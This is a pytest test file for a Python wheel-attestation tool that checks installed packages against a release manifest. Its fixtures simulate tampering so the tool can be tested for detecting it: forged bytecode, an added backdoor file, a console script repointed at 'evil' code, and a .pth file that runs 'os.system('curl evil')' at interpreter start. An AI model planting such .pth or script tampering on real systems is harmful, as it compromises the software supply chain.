"""Tests for artifact-era attestation (WI-036).

The point of these tests is that the attestation never claims more than it can
prove, so the fixtures deliberately look like what a **real** installer leaves
behind, not a clean ``extractall``: a generated ``../../../bin/<name>`` console
script with its own RECORD row, ``__pycache__/*.pyc`` written the way pip does
(a RECORD row with an EMPTY digest), ``INSTALLER`` / ``REQUESTED`` /
``direct_url.json``, and a venv-seeder ``.pth`` that no distribution records.

The first revision of this module used a clean tree and therefore missed three
tampers that passed at ``ok=True, binds_release_identity=True`` (review
MAJOR-1); each of those is a named test below.
"""

from __future__ import annotations

import base64
import hashlib
import json
import zipfile
from pathlib import Path

import pytest

from agent_suite.artifact_attestation import (
    ArtifactAttestation,
    AttestationStrength,
    ComponentAttestation,
    UnattestedKind,
    attest_component,
    binds_release_identity,
    format_text,
    strength_label,
    unattested_kind_label,
    verify_installed_artifacts,
)
from agent_suite.lock import ComponentPin, RegistaVersionQuad, SuiteLock, serialize_lock
from agent_suite.release_manifest import (
    ConstituentArtifact,
    ReleaseManifest,
    build_manifest,
)
from agent_suite.runtime_provenance import (
    ArtifactSource,
    InstallMode,
    RuntimeProvenance,
)

_QUAD = RegistaVersionQuad(
    library_version="0.5.1",
    schema_version=43,
    canonical_workflow_version="2",
    envelope_version=5,
)
_FIXED_TIMESTAMP = "2026-07-31T12:00:00+00:00"

_DIST = "widget"
_VERSION = "1.2.3"
_WHEEL_NAME = f"{_DIST}-{_VERSION}-py3-none-any.whl"
_SCRIPT = "widget-cli"
_PAYLOAD: dict[str, str] = {
    f"{_DIST}/__init__.py": '"""fixture package."""\n__version__ = "1.2.3"\n',
    f"{_DIST}/core.py": "def run() -> int:\n    return 7\n",
}
_ENTRY_POINTS = f"[console_scripts]\n{_SCRIPT} = {_DIST}.core:run\n"
_SCRIPT_BODY = (
    "#!/usr/bin/python3\n"
    "# -*- coding: utf-8 -*-\n"
    "import re\n"
    "import sys\n"
    f"from {_DIST}.core import run\n"
    "if __name__ == '__main__':\n"
    "    sys.exit(run())\n"
)


def _record_digest(data: bytes) -> str:
    raw = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=")
    return "sha256=" + raw.decode("ascii")


def _build_wheel(dest_dir: Path) -> Path:
    """Write a real (minimal but valid) wheel containing ``_PAYLOAD``."""
    dist_info = f"{_DIST}-{_VERSION}.dist-info"
    members: dict[str, bytes] = {name: body.encode("utf-8") for name, body in _PAYLOAD.items()}
    members[f"{dist_info}/METADATA"] = (
        f"Metadata-Version: 2.1\nName: {_DIST}\nVersion: {_VERSION}\n"
    ).encode()
    members[f"{dist_info}/WHEEL"] = (
        b"Wheel-Version: 1.0\nGenerator: test\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    )
    members[f"{dist_info}/entry_points.txt"] = _ENTRY_POINTS.encode("utf-8")
    rows = [
        f"{name},{_record_digest(body)},{len(body)}" for name, body in sorted(members.items())
    ]
    rows.append(f"{dist_info}/RECORD,,")
    members[f"{dist_info}/RECORD"] = ("\n".join(rows) + "\n").encode("utf-8")

    dest_dir.mkdir(parents=True, exist_ok=True)
    wheel_path = dest_dir / _WHEEL_NAME
    with zipfile.ZipFile(wheel_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for name in sorted(members):
            archive.writestr(name, members[name])
    return wheel_path


def _install_wheel(
    wheel: Path,
    env_root: Path,
    *,
    direct_url: dict[str, object] | None = None,
    compile_bytecode: bool = True,
    venv: bool = True,
    seeder_pth: bool = True,
    console_script: bool = True,
) -> Path:
    """Unpack ``wheel`` into an installer-shaped tree; return the .dist-info path."""
    site_packages = env_root / "lib" / "python3.12" / "site-packages"
    site_packages.mkdir(parents=True, exist_ok=True)
    bin_dir = env_root / "bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    if venv:
        (env_root / "pyvenv.cfg").write_text("home = /usr\n", encoding="utf-8")
    if seeder_pth:
        (site_packages / "_virtualenv.pth").write_text("import _virtualenv", encoding="utf-8")
    with zipfile.ZipFile(wheel) as archive:
        archive.extractall(site_packages)
    dist_info = site_packages / f"{_DIST}-{_VERSION}.dist-info"

    rows: list[str] = [
        line
        for line in (dist_info / "RECORD").read_text(encoding="utf-8").splitlines()
        if line and not line.endswith(",,")
    ]

    if console_script:
        script = bin_dir / _SCRIPT
        script.write_text(_SCRIPT_BODY, encoding="utf-8")
        body = script.read_bytes()
        rows.append(f"../../../bin/{_SCRIPT},{_record_digest(body)},{len(body)}")

    for name, content in (("INSTALLER", b"test\n"), ("REQUESTED", b"")):
        (dist_info / name).write_bytes(content)
        rows.append(f"{dist_info.name}/{name},{_record_digest(content)},{len(content)}")
    if direct_url is not None:
        payload = json.dumps(direct_url, separators=(",", ":")).encode("utf-8")
        (dist_info / "direct_url.json").write_bytes(payload)
        rows.append(f"{dist_info.name}/direct_url.json,{_record_digest(payload)},{len(payload)}")

    if compile_bytecode:
        cache = site_packages / _DIST / "__pycache__"
        cache.mkdir(parents=True, exist_ok=True)
        for source in sorted(_PAYLOAD):
            stem = Path(source).stem
            pyc = cache / f"{stem}.cpython-312.pyc"
            pyc.write_bytes(b"\x00\x0f\r\nfake bytecode for " + stem.encode())
            # pip records __pycache__ rows with an EMPTY digest and size.
            rows.append(f"{_DIST}/__pycache__/{pyc.name},,")

    rows.append(f"{dist_info.name}/RECORD,,")
    (dist_info / "RECORD").write_text("\n".join(rows) + "\n", encoding="utf-8")
    return dist_info


def _sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _constituent(
    *,
    wheel_sha256: str = "",
    wheel_filename: str = _WHEEL_NAME,
    version: str = _VERSION,
) -> ConstituentArtifact:
    return ConstituentArtifact(
        ident="regista",
        repo="hraedon/regista",
        pinned_revision="a" * 40,
        package_version=version,
        wheel_filename=wheel_filename,
        wheel_sha256=wheel_sha256,
        source_archive_sha256="",
    )


def _provenance(
    dist_info: Path | None,
    *,
    version: str | None = _VERSION,
    mode: InstallMode = InstallMode.UV_TOOL,
    source: ArtifactSource = ArtifactSource.ARCHIVE,
    archive_url: str | None = None,
    archive_sha256: str | None = None,
    component: str = "regista",
) -> RuntimeProvenance:
    return RuntimeProvenance(
        component=component,
        distribution=_DIST,
        version=version,
        cli_path="/usr/local/bin/regista",
        interpreter="/opt/env/bin/python",
        mode=mode,
        source=source,
        dist_info_path=str(dist_info) if dist_info is not None else None,
        archive_url=archive_url,
        archive_sha256=archive_sha256,
    )


def _kinds(attestation: ComponentAttestation) -> set[UnattestedKind]:
    return {u.kind for u in attestation.unattested}


def _pristine_install(tmp_path: Path) -> tuple[Path, Path]:
    """A wheel plus an install with nothing installer-generated left behind.

    This is the only shape entitled to claim a release binding, and it is the
    posture platform qualification must bring a host to.
    """
    wheel = _build_wheel(tmp_path / "wheels")
    dist_info = _install_wheel(
        wheel,
        tmp_path / "env",
        compile_bytecode=False,
        seeder_pth=False,
        console_script=False,
    )
    for name in ("INSTALLER", "REQUESTED"):
        (dist_info / name).unlink()
    rows = [
        line
        for line in (dist_info / "RECORD").read_text(encoding="utf-8").splitlines()
        if line and not line.endswith(",,")
    ]
    rows = [r for r in rows if "/INSTALLER," not in r and "/REQUESTED," not in r]
    rows.append(f"{dist_info.name}/RECORD,,")
    (dist_info / "RECORD").write_text("\n".join(rows) + "\n", encoding="utf-8")
    return wheel, dist_info


@pytest.fixture
def clean_install(tmp_path: Path) -> tuple[Path, Path]:
    """A wheel plus a uv-shaped install: no bytecode cache, no seeder .pth."""
    wheel = _build_wheel(tmp_path / "wheels")
    dist_info = _install_wheel(
        wheel,
        tmp_path / "env",
        direct_url={"url": wheel.as_uri(), "archive_info": {}},
        compile_bytecode=False,
        seeder_pth=False,
    )
    return wheel, dist_info


@pytest.fixture
def pip_install(tmp_path: Path) -> tuple[Path, Path]:
    """A wheel plus a pip-shaped install: compiled bytecode, seeder .pth."""
    wheel = _build_wheel(tmp_path / "wheels")
    dist_info = _install_wheel(
        wheel,
        tmp_path / "env",
        direct_url={"url": wheel.as_uri(), "archive_info": {}},
        compile_bytecode=True,
    )
    return wheel, dist_info


# ---------------------------------------------------------------------------
# The strength ladder
# ---------------------------------------------------------------------------


def test_every_strength_has_a_label_and_a_binding_answer() -> None:
    """No rung may be silently unhandled (assert_never over the enum)."""
    for strength in AttestationStrength:
        assert strength_label(strength)
        assert isinstance(binds_release_identity(strength), bool)


def test_every_unattested_kind_has_a_reason() -> None:
    for kind in UnattestedKind:
        assert unattested_kind_label(kind)


def test_only_hash_rungs_bind_release_identity() -> None:
    """RECORD self-consistency must NOT be reported as a release binding."""
    assert binds_release_identity(AttestationStrength.WHEEL_HASH_CHAIN)
    assert binds_release_identity(AttestationStrength.RECORDED_ARCHIVE_HASH)
    assert not binds_release_identity(AttestationStrength.INSTALL_RECORD_ONLY)
    assert not binds_release_identity(AttestationStrength.VERSION_ONLY)
    assert not binds_release_identity(AttestationStrength.NO_PROVENANCE)
    assert not binds_release_identity(AttestationStrength.NOT_APPLICABLE)


def test_pristine_install_with_wheel_is_fully_bound(tmp_path: Path) -> None:
    """The strong rung, on the only tree shape entitled to claim a binding."""
    wheel, dist_info = _pristine_install(tmp_path)
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert result.ok, result.mismatches
    assert result.strength is AttestationStrength.WHEEL_HASH_CHAIN
    assert result.unattested == ()
    assert result.binds_release_identity
    assert result.files_verified == len(_PAYLOAD) + 3  # payload + METADATA/WHEEL/entry_points


def test_installer_generated_files_prevent_a_binding_claim(
    clean_install: tuple[Path, Path],
) -> None:
    """A console script is not covered by the manifest, so say so."""
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, archive_url=wheel.as_uri()),
        wheels_dir=wheel.parent,
    )
    assert result.ok, result.mismatches
    assert result.strength is AttestationStrength.WHEEL_HASH_CHAIN
    assert UnattestedKind.INSTALLER_GENERATED in _kinds(result)
    assert not result.binds_release_identity


def test_without_a_wheel_the_best_available_is_install_record_only(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, archive_url=wheel.as_uri()),
    )
    assert result.ok, result.mismatches
    assert result.strength is AttestationStrength.INSTALL_RECORD_ONLY
    assert not result.binds_release_identity
    assert UnattestedKind.WHEEL_UNAVAILABLE in _kinds(result)


def test_recorded_archive_hash_binds_without_the_wheel(tmp_path: Path) -> None:
    wheel, dist_info = _pristine_install(tmp_path)
    digest = _sha256_file(wheel)
    result = attest_component(
        _constituent(wheel_sha256=digest),
        _provenance(dist_info, archive_url=wheel.as_uri(), archive_sha256=digest),
    )
    assert result.ok, result.mismatches
    assert result.strength is AttestationStrength.RECORDED_ARCHIVE_HASH
    assert result.binds_release_identity


def test_recorded_archive_hash_mismatch_is_a_failure(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256="0" * 64),
        _provenance(dist_info, archive_url=wheel.as_uri(), archive_sha256=_sha256_file(wheel)),
    )
    assert not result.ok
    assert any("recorded archive sha256" in m for m in result.mismatches)
    assert result.strength is AttestationStrength.VERSION_ONLY


def test_no_dist_info_degrades_to_version_only() -> None:
    result = attest_component(_constituent(), _provenance(None))
    assert result.ok
    assert result.strength is AttestationStrength.VERSION_ONLY
    assert not result.binds_release_identity


# ---------------------------------------------------------------------------
# MAJOR-1 — content the hash chain does not cover
# ---------------------------------------------------------------------------


def test_pip_written_bytecode_rows_are_unverified_not_skipped(
    pip_install: tuple[Path, Path],
) -> None:
    """A blank-digest RECORD row must never silently pass.

    pip records ``__pycache__/*.pyc`` with an empty digest, so the earlier
    ``_record_hash_to_hex('') -> None -> continue`` skipped it with no mismatch
    and no note, while still claiming a binding.
    """
    wheel, dist_info = pip_install
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, archive_url=wheel.as_uri()),
        wheels_dir=wheel.parent,
    )
    assert result.ok  # nothing is provably wrong
    assert UnattestedKind.BYTECODE_CACHE in _kinds(result)
    assert not result.binds_release_identity
    assert result.to_dict()["binds_release_identity"] is False
    assert result.to_dict()["rung_binds"] is True


def test_tampered_pyc_with_pristine_source_is_not_reported_as_bound(
    pip_install: tuple[Path, Path],
) -> None:
    """Exploit A: forged bytecode, untouched ``.py`` digest."""
    wheel, dist_info = pip_install
    pyc = dist_info.parent / _DIST / "__pycache__" / "core.cpython-312.pyc"
    pyc.write_bytes(b"\x00\x0f\r\nATTACKER BYTECODE")
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, archive_url=wheel.as_uri()),
        wheels_dir=wheel.parent,
    )
    assert not result.binds_release_identity, (
        "a tree whose bytecode cache is outside the hash chain must never "
        "report binds_release_identity=True"
    )
    assert UnattestedKind.BYTECODE_CACHE in _kinds(result)


def test_injected_pyc_where_installer_wrote_none_is_detected(
    clean_install: tuple[Path, Path],
) -> None:
    """Exploit A, uv variant: create a ``.pyc`` where the installer wrote none."""
    wheel, dist_info = clean_install
    cache = dist_info.parent / _DIST / "__pycache__"
    cache.mkdir()
    (cache / "core.cpython-312.pyc").write_bytes(b"\x00\x0f\r\nATTACKER")
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, archive_url=wheel.as_uri()),
        wheels_dir=wheel.parent,
    )
    assert UnattestedKind.BYTECODE_CACHE in _kinds(result)
    assert not result.binds_release_identity
    example = next(u for u in result.unattested if u.kind is UnattestedKind.BYTECODE_CACHE)
    assert any("core.cpython-312.pyc" in e for e in example.examples)


def test_arbitrary_added_file_in_the_owned_tree_is_detected(
    clean_install: tuple[Path, Path],
) -> None:
    """Any file added to a package directory after install is named."""
    wheel, dist_info = clean_install
    (dist_info.parent / _DIST / "backdoor.py").write_text("x = 1\n", encoding="utf-8")
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert UnattestedKind.UNRECORDED_FILE in _kinds(result)
    assert not result.binds_release_identity
    example = next(u for u in result.unattested if u.kind is UnattestedKind.UNRECORDED_FILE)
    assert any("backdoor.py" in e for e in example.examples)


def test_dropped_pth_file_is_detected_without_any_record_edit(
    clean_install: tuple[Path, Path],
) -> None:
    """Exploit C: a ``.pth`` executes on every interpreter start."""
    wheel, dist_info = clean_install
    (dist_info.parent / "zzz-evil.pth").write_text(
        "import os; os.system('curl evil')\n", encoding="utf-8"
    )
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert UnattestedKind.SITE_CUSTOMIZATION in _kinds(result)
    assert not result.binds_release_identity


def test_a_pth_a_distribution_actually_shipped_is_not_flagged(
    clean_install: tuple[Path, Path],
) -> None:
    """No false positives: a ``.pth`` any dist-info records is accounted for."""
    wheel, dist_info = clean_install
    site_packages = dist_info.parent
    pth = site_packages / "legit.pth"
    pth.write_text("import legit\n", encoding="utf-8")
    other = site_packages / "legit-1.0.dist-info"
    other.mkdir()
    body = pth.read_bytes()
    (other / "RECORD").write_text(
        f"legit.pth,{_record_digest(body)},{len(body)}\nlegit-1.0.dist-info/RECORD,,\n",
        encoding="utf-8",
    )
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert UnattestedKind.SITE_CUSTOMIZATION not in _kinds(result)


def test_tampered_console_script_repointed_at_attacker_code_is_a_mismatch(
    clean_install: tuple[Path, Path],
) -> None:
    """Exploit B: rewrite ``bin/<name>`` and blank its RECORD digest.

    The script body is installer-generated so no manifest hash covers it, but
    the wheel's ``entry_points.txt`` IS covered — so a script importing anything
    the release did not declare is a hard mismatch even with a blanked RECORD.
    """
    wheel, dist_info = clean_install
    script = dist_info.parent.parents[2] / "bin" / _SCRIPT
    assert script.is_file()
    script.write_text(
        "#!/usr/bin/python3\nimport sys\nfrom evil.payload import pwn\nsys.exit(pwn())\n",
        encoding="utf-8",
    )
    record = dist_info / "RECORD"
    lines = [
        f"../../../bin/{_SCRIPT},," if line.startswith(f"../../../bin/{_SCRIPT},") else line
        for line in record.read_text(encoding="utf-8").splitlines()
    ]
    record.write_text("\n".join(lines) + "\n", encoding="utf-8")

    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not result.ok
    assert any(
        "is not a console_scripts entry point" in m for m in result.mismatches
    ), result.mismatches
    assert result.strength is AttestationStrength.VERSION_ONLY


def test_untampered_console_script_target_is_accepted(
    clean_install: tuple[Path, Path],
) -> None:
    """The target check must not false-positive on a correct script."""
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert result.ok, result.mismatches


def test_blanked_digest_on_a_wheel_shipped_file_does_not_hide_it(
    clean_install: tuple[Path, Path],
) -> None:
    """Blanking an install-RECORD row cannot evade the wheel RECORD."""
    wheel, dist_info = clean_install
    (dist_info.parent / _DIST / "core.py").write_text(
        "def run() -> int:\n    return 0  # tampered\n", encoding="utf-8"
    )
    record = dist_info / "RECORD"
    lines = [
        f"{_DIST}/core.py,," if line.startswith(f"{_DIST}/core.py,") else line
        for line in record.read_text(encoding="utf-8").splitlines()
    ]
    record.write_text("\n".join(lines) + "\n", encoding="utf-8")
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not result.ok
    assert any("core.py" in m and "digest mismatch" in m for m in result.mismatches)


# ---------------------------------------------------------------------------
# Tamper detection on wheel-shipped files
# ---------------------------------------------------------------------------


def test_edited_installed_file_fails_the_chain(clean_install: tuple[Path, Path]) -> None:
    wheel, dist_info = clean_install
    (dist_info.parent / _DIST / "core.py").write_text(
        "def run() -> int:\n    return 0  # tampered\n", encoding="utf-8"
    )
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not result.ok
    assert any("core.py" in m and "digest mismatch" in m for m in result.mismatches)
    assert result.strength is AttestationStrength.VERSION_ONLY
    assert result.files_verified == 0  # a failed rung reports no verified count


def test_rewritten_record_still_fails_the_wheel_chain(
    clean_install: tuple[Path, Path],
) -> None:
    """Why the install RECORD is not the strong rung."""
    wheel, dist_info = clean_install
    tampered = b"def run() -> int:\n    return 0  # tampered\n"
    (dist_info.parent / _DIST / "core.py").write_bytes(tampered)
    record = dist_info / "RECORD"
    lines = [
        f"{_DIST}/core.py,{_record_digest(tampered)},{len(tampered)}"
        if line.startswith(f"{_DIST}/core.py,")
        else line
        for line in record.read_text(encoding="utf-8").splitlines()
    ]
    record.write_text("\n".join(lines) + "\n", encoding="utf-8")

    weak = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)), _provenance(dist_info)
    )
    assert weak.ok
    assert weak.strength is AttestationStrength.INSTALL_RECORD_ONLY
    assert not weak.binds_release_identity

    strong = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not strong.ok
    assert any("core.py" in m for m in strong.mismatches)


def test_missing_installed_file_is_a_mismatch(clean_install: tuple[Path, Path]) -> None:
    wheel, dist_info = clean_install
    (dist_info.parent / _DIST / "core.py").unlink()
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not result.ok
    assert any("missing on disk" in m for m in result.mismatches)


def test_wheel_hash_mismatch_is_reported_before_the_chain(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256="1" * 64), _provenance(dist_info), wheels_dir=wheel.parent
    )
    assert not result.ok
    assert any("wheel_sha256 mismatch" in m for m in result.mismatches)


def test_mismatches_are_not_duplicated_across_passes(
    clean_install: tuple[Path, Path],
) -> None:
    """The wheel pass and the install pass must not each report one file."""
    wheel, dist_info = clean_install
    (dist_info.parent / _DIST / "core.py").write_text("tampered\n", encoding="utf-8")
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert len(result.mismatches) == len(set(result.mismatches))


# ---------------------------------------------------------------------------
# Gaps must not be mismatches (review MINOR-1, MINOR-2, MINOR-4)
# ---------------------------------------------------------------------------


def test_absent_wheel_in_wheels_dir_is_a_gap_not_a_failure(
    clean_install: tuple[Path, Path], tmp_path: Path
) -> None:
    """An unavoidable evidence gap must not red a correct estate (MINOR-2)."""
    wheel, dist_info = clean_install
    empty = tmp_path / "empty"
    empty.mkdir()
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info),
        wheels_dir=empty,
    )
    assert result.ok, result.mismatches
    assert UnattestedKind.WHEEL_UNAVAILABLE in _kinds(result)
    assert not result.binds_release_identity


def test_pristine_non_venv_install_does_not_red(tmp_path: Path) -> None:
    """MINOR-1: a SYSTEM / PIP_USER / dist-packages tree has no pyvenv.cfg.

    The earlier fallback made ``../../../bin/<name>`` resolve "outside the
    install root", reddening a *pristine* install on install modes this codebase
    explicitly models.
    """
    wheel = _build_wheel(tmp_path / "wheels")
    prefix = tmp_path / "usr"
    dist_info = _install_wheel(
        wheel,
        prefix,
        direct_url={"url": wheel.as_uri(), "archive_info": {}},
        compile_bytecode=False,
        venv=False,
        seeder_pth=False,
    )
    assert not (prefix / "pyvenv.cfg").exists()
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel)),
        _provenance(dist_info, mode=InstallMode.PIP_USER),
        wheels_dir=wheel.parent,
    )
    assert result.ok, result.mismatches
    assert result.strength is AttestationStrength.WHEEL_HASH_CHAIN


def test_install_root_resolves_known_layouts() -> None:
    from agent_suite.artifact_attestation import _install_root

    assert _install_root(Path("/usr/lib/python3/dist-packages")) == Path("/usr")
    assert _install_root(Path("/opt/x/lib/python3.12/site-packages")) == Path("/opt/x")
    assert _install_root(Path("/opt/x/lib64/python3.12/site-packages")) == Path("/opt/x")
    assert _install_root(Path("/opt/x/Lib/site-packages")) == Path("/opt/x")


def test_relocated_data_rows_are_a_gap_not_a_failure(tmp_path: Path) -> None:
    """MINOR-4: a component shipping data_files must not red every attestation."""
    from agent_suite.artifact_attestation import _Coverage, _verify_entries

    coverage = _Coverage()
    _verify_entries(
        {f"{_DIST}-{_VERSION}.data/scripts/tool": "a" * 64},
        tmp_path,
        tmp_path,
        label="regista",
        coverage=coverage,
        record_name="x/RECORD",
    )
    assert coverage.mismatches == []
    assert UnattestedKind.RELOCATED_DATA in coverage.unattested


def test_wheel_is_read_once_for_hash_and_record(
    clean_install: tuple[Path, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """MINOR-3: two opens would leave the in-wheel RECORD outside the hash."""
    import agent_suite.artifact_attestation as mod

    wheel, _dist_info = clean_install
    expected_digest = _sha256_file(wheel)  # read before counting
    reads: list[Path] = []
    original = Path.read_bytes

    def _counting_read_bytes(self: Path) -> bytes:
        if self.suffix == ".whl":
            reads.append(self)
        return original(self)

    monkeypatch.setattr(Path, "read_bytes", _counting_read_bytes)
    content = mod._read_wheel(wheel)
    assert content.sha256 == expected_digest
    assert content.record
    assert content.entry_points is not None
    assert len(reads) == 1


# ---------------------------------------------------------------------------
# Non-cryptographic agreement checks
# ---------------------------------------------------------------------------


def test_version_mismatch_fails(clean_install: tuple[Path, Path]) -> None:
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(wheel_sha256=_sha256_file(wheel), version="9.9.9"),
        _provenance(dist_info),
        wheels_dir=wheel.parent,
    )
    assert not result.ok
    assert any("version mismatch" in m for m in result.mismatches)


def test_installed_from_a_differently_named_wheel_fails(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    result = attest_component(
        _constituent(
            wheel_sha256="", wheel_filename=f"{_DIST}-{_VERSION}-py3-none-manylinux.whl"
        ),
        _provenance(dist_info, archive_url=wheel.as_uri()),
    )
    assert not result.ok
    assert any("but the manifest records" in m for m in result.mismatches)


# ---------------------------------------------------------------------------
# Not-applicable vs. gap
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("mode", "source", "fragment", "strength"),
    [
        (
            InstallMode.ABSENT,
            ArtifactSource.UNKNOWN,
            "absent",
            AttestationStrength.NOT_APPLICABLE,
        ),
        (
            InstallMode.UNKNOWN,
            ArtifactSource.UNKNOWN,
            "could not be determined",
            AttestationStrength.NO_PROVENANCE,
        ),
        (
            InstallMode.EDITABLE,
            ArtifactSource.EDITABLE,
            "not a release wheel",
            AttestationStrength.NOT_APPLICABLE,
        ),
        (
            InstallMode.VENV,
            ArtifactSource.VCS,
            "not a release wheel",
            AttestationStrength.NOT_APPLICABLE,
        ),
        (
            InstallMode.VENV,
            ArtifactSource.LOCAL,
            "not a release wheel",
            AttestationStrength.NOT_APPLICABLE,
        ),
    ],
)
def test_non_artifact_installs_are_classified_honestly(
    mode: InstallMode,
    source: ArtifactSource,
    fragment: str,
    strength: AttestationStrength,
) -> None:
    """An unreadable provenance is a GAP, not "not applicable"."""
    result = attest_component(
        _constituent(wheel_sha256="a" * 64), _provenance(None, mode=mode, source=source)
    )
    assert result.strength is strength
    assert result.ok
    assert fragment in result.detail


# ---------------------------------------------------------------------------
# Suite-level roll-up
# ---------------------------------------------------------------------------


def _manifest(
    *,
    wheel_hashes: dict[str, tuple[str, str]] | None = None,
    umbrella: tuple[str, str] | None = None,
    umbrella_version: str | None = None,
) -> ReleaseManifest:
    lock = SuiteLock(
        release="1.0.0-dev",
        regista_quad=_QUAD,
        components={
            "regista": ComponentPin("hraedon/regista", _VERSION, "a" * 40),
            "dossier": ComponentPin("hraedon/dossier", "0.1.0", "b" * 40),
        },
    )
    return build_manifest(
        lock=lock,
        lock_text=serialize_lock(lock),
        release_tag="v1.0.0-rc.9",
        umbrella_tag_sha="c" * 40,
        wheel_hashes=wheel_hashes,
        umbrella_package_version=umbrella_version,
        umbrella_wheel=umbrella,
        generated_at=_FIXED_TIMESTAMP,
    )


def test_verify_installed_artifacts_rolls_up_the_weakest_rung(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, _sha256_file(wheel))})
    provenance = {
        "regista": _provenance(dist_info, archive_url=wheel.as_uri()),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    result = verify_installed_artifacts(manifest, provenance)
    assert result.ok
    assert result.strength is AttestationStrength.INSTALL_RECORD_ONLY
    assert result.unbound == ("regista",)


def test_require_binding_turns_an_unbound_install_red(
    clean_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = clean_install
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, _sha256_file(wheel))})
    provenance = {"regista": _provenance(dist_info, archive_url=wheel.as_uri())}
    assert verify_installed_artifacts(manifest, provenance).ok
    strict = verify_installed_artifacts(manifest, provenance, require_binding=True)
    assert not strict.ok
    assert "no cryptographic binding" in strict.note


def test_require_binding_reds_a_host_with_nothing_attestable() -> None:
    """MAJOR-3: the qualification gate must not fail OPEN.

    All components absent means zero attestable artifacts; a green answer there
    would certify nothing at all.
    """
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, "d" * 64)})
    provenance = {
        "regista": _provenance(None, mode=InstallMode.ABSENT),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    assert verify_installed_artifacts(manifest, provenance).ok
    strict = verify_installed_artifacts(manifest, provenance, require_binding=True)
    assert not strict.ok
    assert "nothing here to attest" in strict.note


def test_require_binding_reds_an_all_editable_dev_box() -> None:
    """MAJOR-3: every component editable is also zero attestable artifacts."""
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, "d" * 64)})
    provenance = {
        ident: _provenance(None, mode=InstallMode.EDITABLE, source=ArtifactSource.EDITABLE)
        for ident in ("regista", "dossier")
    }
    strict = verify_installed_artifacts(manifest, provenance, require_binding=True)
    assert not strict.ok
    assert strict.to_dict()["binds_release_identity"] is False


def test_require_binding_is_satisfied_by_a_pristine_chain(tmp_path: Path) -> None:
    wheel, dist_info = _pristine_install(tmp_path)
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, _sha256_file(wheel))})
    provenance = {
        "regista": _provenance(dist_info),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    result = verify_installed_artifacts(
        manifest, provenance, wheels_dir=wheel.parent, require_binding=True
    )
    assert result.ok, result.note
    assert result.strength is AttestationStrength.WHEEL_HASH_CHAIN
    assert result.unbound == ()


def test_missing_provenance_record_is_a_gap_that_counts() -> None:
    """MAJOR-2: "no provenance record" must not report ok and then vanish."""
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, "d" * 64)})
    result = verify_installed_artifacts(manifest, {}, require_binding=True)
    assert not result.ok
    assert all(c.strength is AttestationStrength.NO_PROVENANCE for c in result.components)
    assert set(result.unbound) == {"regista", "dossier"}


def test_umbrella_artifact_is_attested_when_present(tmp_path: Path) -> None:
    """MAJOR-2: the umbrella entry must actually be checkable on a host."""
    wheel, dist_info = _pristine_install(tmp_path)
    manifest = _manifest(umbrella_version=_VERSION, umbrella=(_WHEEL_NAME, _sha256_file(wheel)))
    assert manifest.umbrella_artifact is not None
    provenance = {
        "regista": _provenance(None, mode=InstallMode.ABSENT),
